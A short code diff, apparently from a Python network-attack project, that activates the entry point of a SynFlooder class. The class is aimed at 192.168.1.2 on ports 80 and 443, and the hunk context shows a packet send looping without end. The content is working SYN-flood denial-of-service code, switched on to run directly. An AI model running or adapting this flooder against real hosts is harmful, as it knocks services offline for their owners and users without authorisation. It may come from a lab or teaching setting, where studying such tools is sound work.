@@ -63,13 +63,11 @@ class SynFlooder(AttackerBaseClass):
 		send(ip/tcp, verbose = False, loop = True)
 
 
-# def main():
-# 	attacker = SynFlooder("192.168.1.2")
-# 	a = SynFlooder("192.168.1.2", target_ports=[80, 443])
-# 	a.print_target_ip()
-# 	a.print_target_ports()
-# 	a.start()
-# 	attacker.start()
+def main():
+	a = SynFlooder("192.168.1.2", target_ports=[80, 443])
+	a.print_target_ip()
+	a.print_target_ports()
+	a.start()
 
-# if __name__ == "__main__":
-# 	main()
+if __name__ == "__main__":
+	main()
